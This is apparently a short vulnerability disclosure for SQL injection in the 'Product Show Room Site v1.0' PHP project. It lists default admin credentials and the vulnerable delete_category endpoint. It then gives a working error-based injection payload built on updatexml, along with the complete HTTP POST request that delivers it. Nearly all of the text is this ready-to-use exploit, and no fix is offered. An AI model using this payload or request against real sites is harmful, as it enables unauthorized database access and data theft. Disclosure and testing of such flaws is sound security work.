# Product Show Room Site v1.0 by oretnom23 has SQL injection

The password for the backend login account is: admin/admin123

vendors: https://www.sourcecodester.com/php/15370/product-show-room-site-phpoop-free-source-code.html

Vulnerability File: /psrs/classes/Master.php?f=delete_category

Vulnerability location: /psrs/classes/Master.php?f=delete_category, id

Current database name: hsrs_db ,length is 7

[+] Payload: id=1' and updatexml(1,concat(0x7e,(select database()),0x7e),0)--+ // Leak place ---> id

```sql
POST /psrs/classes/Master.php?f=delete_category HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=7g6mvmuq5m1o1cvqrhprll4jr1
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 65

id=1' and updatexml(1,concat(0x7e,(select database()),0x7e),0)--+
```

![image](https://user-images.githubusercontent.com/54017627/171827310-572ad625-d46b-46a4-8413-8f699f00cabb.png)
